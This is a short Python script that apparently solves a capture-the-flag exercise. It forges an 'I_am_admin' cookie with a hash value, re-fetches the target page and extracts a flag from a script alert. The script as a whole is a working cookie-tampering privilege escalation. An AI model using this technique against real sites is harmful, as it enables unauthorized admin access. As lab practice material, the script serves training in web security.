import requests
import re

def get_IP():
	ip = None
	with open('../../IP') as file:
		return file.readlines()[0].strip()

with requests.Session() as s:
	s.get(get_IP())
	print('original cookies:')
	print(s.cookies.get_dict())
	s.cookies.set('I_am_admin', None)
	s.cookies.set('I_am_admin', "b326b5062b2f0e69046810717534cb09")
	print('modified cookies:')
	print(s.cookies.get_dict())
	r = s.get(get_IP())
	script = r.text
	result = re.search("<script>alert\(\'(.*)\'\); </script>", script)
	print(result.group(1))